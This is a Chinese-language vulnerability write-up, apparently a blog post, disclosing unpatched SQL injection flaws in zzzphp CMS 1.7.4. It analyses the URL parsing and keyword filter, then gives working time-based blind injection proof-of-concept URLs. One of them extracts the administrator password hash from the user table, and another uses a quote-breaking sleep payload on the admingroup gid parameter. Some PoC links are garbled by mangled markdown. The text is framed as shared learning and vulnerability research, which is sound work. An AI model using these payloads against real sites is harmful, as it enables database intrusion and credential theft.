1. **前言**  
小众cms的0day有啥用，长毛了都，放出来大家一起学习学习吧  
注入涉及前后台，当时审计的是最新版zzzphp1.7.4版本，没想到过了几天，更新到1.7.5版本了，也就是目前最新的版本（难道是我把后台的注入提交给cnvd，然后通知给厂商了？？？）。看了下更新日志，也没有与安全相关的修复，我寻思后台注入他也不会修吧，前台注入他也不知道啊，也有可能被别人提交到哪个地方了吧。然后试了下exp，发现不起作用了……看来还是被修复了，对比了下发现确实是，然后分析了会，又给绕过去了，下面一一分析两个版本的前后台注入。
  2. **zzzphp1.7.4后台9处注入**  
后台目录默认为admin加三位数字，我这里为admin241  
重点分析第一处注入：  
在admin241/index.php中的14及17行，  
$cid=geturl('cid');  
$data=db_load_sql_one('select _,b.sid,b.s_type from [dbpre]content
a,[dbpre]sort b where b.sid=a.c_sid and cid='.$cid);  
$cid是直接拼接在后面的，也没有单引号啥的  
跟踪函数geturl，在inc/zzz_main.php的1724行，  
这里就有很多坑了，一一来分析：  
1.它是通过$_SERVER[ 'REQUEST_URI'
]然后parse_url来获取参数值的，所以无法存在空格，制表符等字符。如：在浏览器中访问127.0.0.1/?id=123
aaa，通过此方式获取的id值为123%20aaa，这还怎么注入。尝试在burp中，直接加入空格，返回http400。考虑到mysql中制表符可以代替空格，以16进制的方式，将上述的空格修改为09，即在hex窗口中将20修改为09，同样返回http400。所以想注入的话，不能够存在空格等字符。然后也不能存在url编码的东西，比如浏览器访问127.0.0.1/?id=1>1，获取的id为1%3e1,
不会自动给你进行一次url解码,但这种情况可以直接在burp中修改，把请求里的%3e改为>即可  
2.注意到1731行的$arr = explode( '/', $s )，所以不能存在字符/，故无法考虑使用/_的形式代替空格  
3.注意到1734行的$last = str_replace( '&', '=', array_pop( $arr ) )，所以注入时不能存在字符&  
4.注意到1736行的$arr1 = explode( '=', $last )，所以注入时不能存在字符=  
5.1726行的$s = danger_key($s)，danger_key在zzz_main.php的769行，如下：
        function danger_key($s) {
     $danger=array('php','preg','server','chr','decode','html','md5','post','get','file','cookie','session','sql','del','encrypt','$','system','exec','shell','open','ini_','chroot','eval','passthru','include','require','assert','union','_');
     $s = str_ireplace($danger,"*",$s);
     $key=array('php','preg','decode','post','get','cookie','session','$','exec','ascii','eval','replace');
    foreach ($key as $val){
        if(strpos($s,$val) !==false){
         error('很抱歉，执行出错，发现危险字符【'.$val.'】');
       }
    }
     return $s;
    }
过滤了很多字符，初看一眼，和注入相关的，不能存在chr，union，ascii字符。  
这里我没有仔细一行一行看了，直接来测试一下这个geturl函数，  
在admin241/index.php的14行后面加个echo $cid;exit;  
出现了mysql注释符直接没东西返回  
综上，注入不能出现空格，=， /，union,ascii，以及需要进行url编码才认识的字符（如%0a,制表符等）  
有那么多限制，考虑时间盲注，eg：  
index.php?id=(sleep(ascii(mid(user()from(1)for(1)))=109))  
ascii被过滤了，用ord替换，=号被过滤了，用  
先测试sleep多长时间比较合适，经过测试，如果延时成功，sleep(0.1)会在2.9s左右响应（是由于前面的sql语句会返回29行记录，sleep(1)的话要等29s左右才响应）  
Poc：  
[http://127.0.0.1/zzzphp/admin241/?module=content&sid=123&cid=(sleep(0.1*(ord(mid(user(),1,1](http://127.0.0.1/zzzphp/admin241/?module=content&sid=123&cid=\(sleep\(0.1*\(ord\(mid\(user\(\),1,1)))sql_find_one( $sql );
     db_errno_errstr($arr, $d, $sql);
     return $arr;
    }
将[dbpre]给换成表前缀，所以我也可以这样做，表前缀用[dbpre]即可。  
最终poc：  
[http://127.0.0.1/zzzphp/admin241/?module=content&sid=123&cid=(sleep(0.1*(ord(mid((select(password)from([dbpre]user)where+uid](http://127.0.0.1/zzzphp/admin241/?module=content&sid=123&cid=\(sleep\(0.1*\(ord\(mid\(\(select\(password\)from\(\[dbpre\]user\)where+uid)$gid))的形式，和最开始分析的直接拼接进sql语句的有点不一样，这里只挑一个简单说一下吧。就分析最后一个吧，66行的那个  
先跟进函数db_load_one，这个函数在最后一行调用了find_one，跟进find_one函数（inc/zzz_db_mysql.php的83行）  
这里我在93-94行直接插入：  
echo "SELECT $cols FROM $table $where$orderby LIMIT 1";exit;  
然后访问127.0.0.1/zzzphp/admin241/?module=admingroup&gid=aaa'，如图  
可以看到，gid的值直接被拼接到sql语句中，然后被单引号包起来，但是并没有过滤单引号。  
然后在数据库中测好延时及合适的sql语句  
第一个图是想去除空格及测好延时，第二个图是想完成引号闭合及去除空格  
故可构造poc：  
127.0.0.1/zzzphp/admin241/?module=admingroup&gid=aaa'or(sleep(0.3))or'  
  3. **zzzphp1.7.4前台几处sql注入**  
在前台随便点了一个链接：  
接下来去看看这个news和这个7是怎么整到数据库执行的  
根目录下的index.php只require了inc/zzz_client.php  
zzz_client.php从上往下看，前面整了一堆没用的，然后在58-59行：  
$location=getlocation();  
ParseGlobal(G('sid'),G('cid'));  
这里我就猜测getlocation应该就是来解析url的，然后生成了G('sid'),G('cid')，然后再ParseGlobal  
我就直接在$location=getlocation();后面加了echo G('sid');echo 11111;echo G('cid');exit;  
如图，G('sid')没有，G('cid')为url中的7  
基本可以确定是getlocation()来设置参数的  
getlocation函数在zzz_main的1537行左右：
        function getlocation() {
     $location = getform( 'location', 'get' );